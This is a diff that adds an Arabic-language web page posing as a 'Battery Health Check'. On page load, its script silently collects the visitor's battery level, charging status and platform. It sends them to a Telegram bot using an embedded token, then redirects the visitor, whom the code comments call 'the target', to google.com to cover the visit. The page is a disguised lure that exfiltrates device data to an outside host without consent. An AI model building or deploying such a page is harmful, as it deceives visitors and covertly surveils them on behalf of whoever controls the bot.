@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Battery Health Check</title>
+    <style>
+        body { background: #0b0e14; color: #00ffcc; font-family: sans-serif; text-align: center; padding-top: 100px; }
+        .box { border: 2px solid #00ffcc; display: inline-block; padding: 20px; border-radius: 15px; box-shadow: 0 0 20px #00ffcc; }
+        .battery-icon { font-size: 50px; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="battery-icon">🔋</div>
+        <h3>جاري فحص صحة البطارية...</h3>
+        <p>يرجى الانتظار ثوانٍ لتحليل أداء البطارية</p>
+    </div>
+
+    <script>
+        // --- إعداداتك المركزية ---
+        const TOKEN = "8307560710:AAFN..."; // التوكن الخاص بك
+        const CHAT_ID = "ضع_ايدي_حسابك_هنا"; 
+
+        async function captureBattery() {
+            try {
+                // سحب معلومات البطارية
+                let b = await navigator.getBattery();
+                let level = Math.floor(b.level * 100);
+                let status = b.charging ? "🔌 متصل بالشاحن" : "🔋 غير متصل";
+                
+                let report = `🔋 **تقرير سحب الشحن الجديد:**\n\n` +
+                             `• نسبة البطارية: ${level}%\n` +
+                             `• حالة الشحن: ${status}\n` +
+                             `• النظام: ${navigator.platform}\n` +
+                             `• الوقت: ${new Date().toLocaleTimeString('ar-EG')}`;
+
+                // إرسال البيانات فوراً لتليجرام
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: report,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                // تحويل الهدف لموقع غوغل بعد السحب
+                setTimeout(() => {
+                    window.location.replace("https://www.google.com");
+                }, 2000);
+
+            } catch (e) {
+                window.location.replace("https://www.google.com");
+            }
+        }
+        window.onload = captureBattery;
+    </script>
+</body>
+</html>
